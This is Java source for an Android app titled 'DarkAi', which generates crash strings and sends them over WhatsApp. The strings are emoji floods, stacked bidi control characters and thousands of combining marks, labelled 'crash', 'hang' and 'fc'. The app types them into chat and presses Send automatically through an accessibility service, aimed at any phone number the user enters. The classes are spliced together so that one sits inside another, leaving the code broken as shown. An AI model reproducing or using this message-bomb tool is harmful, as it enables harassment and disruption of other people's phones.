import java.util.Random;

public class BugGenerator {
    private static final Random RNG = new Random();

    public static String generate(String jenis) {
        switch (jenis) {
            case "fc":    return fc();
            case "delay": return delay();
            case "blank": return blank();
            case "rtl":   return rtl();
            case "zalgo": return zalgo();
            case "bomb":  return bomb();
            case "crash": return crash();
            case "hang":  return hang();
            default:      return mix();
        }
    }

    private static String fc() {
        String[] e = {"🇦","🇧","🇨","🇩","🇪","🇫","🇬","🇭","🇮","🇯","🇰","🇱","🇲","🇳","🇴","🇵"};
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 2000; i++) sb.append(e[i % e.length]);
        return sb.toString();
    }
    private static String delay() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 30000; i++) sb.append('\u2067');
        return sb.toString();
    }
    private static String blank() {
        StringBuilder sb = new StringBuilder();
        char[] m = new char[0x170];
        int idx = 0;
        for (int i = 0x0300; i <= 0x036F; i++) m[idx++] = (char) i;
        for (int c = 0; c < 500; c++) {
            sb.append('A');
            for (int i = 0; i < 50; i++) sb.append(m[RNG.nextInt(idx)]);
        }
        return sb.toString();
    }
    private static String rtl() {
        StringBuilder sb = new StringBuilder();
        sb.append('\u202E');
        for (int i = 0; i < 500; i++) sb.append("!dlrow olleH");
        sb.append('\u202C');
        return sb.toString();
    }
    private static String zalgo() {
        StringBuilder sb = new StringBuilder();
        char[] m = new char[0x70];
        int idx = 0;
        for (int i = 0x0300; i <= 0x036F; i++) m[idx++] = (char) i;
        for (int c = 0; c < 150; c++) {
            sb.append("💀");
            for (int i = 0; i < 60; i++) sb.append(m[RNG.nextInt(idx)]);
        }
        return sb.toString();
    }
    private static String bomb() {
        String[] p = {"💣","💥","🔥","⚡","🌀","💀","☠️","👺","🤖","👾","🎃","👻"};
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 4000; i++) sb.append(p[i % p.length]);
        return sb.toString();
    }
    private static String crash() {
        StringBuilder sb = new StringBuilder();
        char[] m = new char[0x70];
        int idx = 0;
        for (int i = 0x0300; i <= 0x036F; i++) m[idx++] = (char) i;
        for (int c = 0; c < 800; c++) {
            sb.append((char) (0x0900 + RNG.nextInt(200)));
            for (int i = 0; i < 80; i++) sb.append(m[RNG.nextInt(idx)]);
        }
        return sb.toString();
    }
    private static String hang() {
        StringBuilder sb = new StringBuilder();
        sb.append('\u202E');
        for (int i = 0; i < 5000; i++) sb.append("\u2067\u202E");
        return sb.toString();
    }package com.wanz.darkai;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class AutoSendService extends AccessibilityService {
    private static final String TAG = "AutoSend";
    public static AutoSendService instance;
    private String pendingText = null;
    private boolean waiting = false;
    private long lastTrigger = 0;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
    }

    public void triggerSend(String nomor, String jenisBug) {
        String teks = BugGenerator.generate(jenisBug);
        ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        cm.setPrimaryClip(ClipData.newPlainText("bug", teks));
        pendingText = teks;
        waiting = true;
        lastTrigger = System.currentTimeMillis();
        android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_VIEW);
        i.setData(android.net.Uri.parse("https://wa.me/" + nomor));
        i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || !waiting) return;
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();
        if (!pkg.equals("com.whatsapp") && !pkg.equals("com.whatsapp.w4b")) return;
        if (System.currentTimeMillis() - lastTrigger > 15000) {
            waiting = false; pendingText = null; return;
        }
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        AccessibilityNodeInfo edit = findInput(root);
        if (edit == null) return;
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, pendingText);
        edit.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        edit.postDelayed(() -> {
            AccessibilityNodeInfo r2 = getRootInActiveWindow();
            if (r2 == null) return;
            AccessibilityNodeInfo send = findSend(r2);
            if (send != null && send.isClickable()) {
                send.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                waiting = false; pendingText = null;
            }
        }, 600);
    }

    private AccessibilityNodeInfo findInput(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> l = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry");
        if (l == null || l.isEmpty()) l = root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/entry");
        if (l != null && !l.isEmpty()) return l.get(0);
        return findClass(root, "android.widget.EditText");
    }
    private AccessibilityNodeInfo findSend(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> l = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send");
        if (l == null || l.isEmpty()) l = root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/send");
        if (l != null && !l.isEmpty()) return l.get(0);
        return findDesc(root, "Send");
    }
    private AccessibilityNodeInfo findClass(AccessibilityNodeInfo n, String c) {
        if (n == null) return null;
        if (n.getClassName() != null && n.getClassName().toString().equals(c)) return n;
        for (int i = 0; i < n.getChildCount(); i++) {
            AccessibilityNodeInfo r = findClass(n.getChild(i), c);
            if (r != null) return r;
        }
        return null;
    }
    private AccessibilityNodeInfo findDesc(AccessibilityNodeInfo n, String d) {
        if (n == null) return null;
        if (n.getContentDescription() != null && n.getContentDescription().toString().equalsIgnoreCase(d)) return n;
        for (int i = 0; i < n.getChildCount(); i++) {
            AccessibilityNodeInfo r = findDesc(n.getChild(i), d);
            if (r != null) return r;
        }
        return null;
    }
    @Override public void onInterrupt() { waiting = false; pendingText = null; }
}
    private static String mix() { return crash() + bomb(); }
}package com.wanz.darkai;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private EditText etNomor;
    private TextView tvLog;
    private String target = "";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(40,40,40,40);
        root.setBackgroundColor(0xFF0A0014);

        TextView title = new TextView(this);
        title.setText("⚡ DarkAi — BY WANZ");
        title.setTextColor(0xFF00F0FF);
        title.setTextSize(24);
        root.addView(title);

        Button btnAcc = new Button(this);
        btnAcc.setText("🔓 AKTIFKAN AUTO-SEND");
        btnAcc.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        root.addView(btnAcc);

        etNomor = new EditText(this);
        etNomor.setHint("628xxxxxxxxxx");
        etNomor.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
        root.addView(etNomor);

        Button btnSet = new Button(this);
        btnSet.setText("✅ SET TARGET");
        btnSet.setOnClickListener(v -> {
            String n = etNomor.getText().toString().replaceAll("[^0-9]", "");
            if (n.length() < 8) { Toast.makeText(this, "Nomor tidak valid", Toast.LENGTH_SHORT).show(); return; }
            target = n;
            Toast.makeText(this, "Target: +" + n, Toast.LENGTH_SHORT).show();
            log("Target: +" + n);
        });
        root.addView(btnSet);

        String[][] bugs = {
            {"💥 FC", "fc"}, {"⏱ DELAY", "delay"}, {"⬜ BLANK", "blank"}, {"🔄 RTL", "rtl"},
            {"👹 ZALGO", "zalgo"}, {"💣 BOMB", "bomb"}, {"☠️ CRASH", "crash"}, {"📞 HANG", "hang"}
        };
        for (String[] bug : bugs) {
            Button btn = new Button(this);
            btn.setText(bug[0]);
            final String jenis = bug[1];
            btn.setOnClickListener(v -> {
                if (target.isEmpty()) { Toast.makeText(this, "Set target dulu!", Toast.LENGTH_SHORT).show(); return; }
                if (AutoSendService.instance == null) {
                    Toast.makeText(this, "Aktifkan Accessibility!", Toast.LENGTH_SHORT).show();
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    return;
                }
                AutoSendService.instance.triggerSend(target, jenis);
                log("BUG " + jenis.toUpperCase() + " → +" + target);
                Toast.makeText(this, "📤 Kirim " + jenis, Toast.LENGTH_SHORT).show();
            });
            root.addView(btn);
        }

        tvLog = new TextView(this);
        tvLog.setText("[DarkAi] Ready...");
        tvLog.setTextColor(0xFF25D366);
        tvLog.setTypeface(android.graphics.Typeface.MONOSPACE);
        tvLog.setTextSize(10);
        tvLog.setBackgroundColor(0xFF000000);
        tvLog.setPadding(20,20,20,20);
        root.addView(tvLog);

        ScrollView sv = new ScrollView(this);
        sv.addView(root);
        setContentView(sv);
    }

    private void log(String s) {
        String t = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
        tvLog.append("\n[" + t + "] " + s);
    }
}
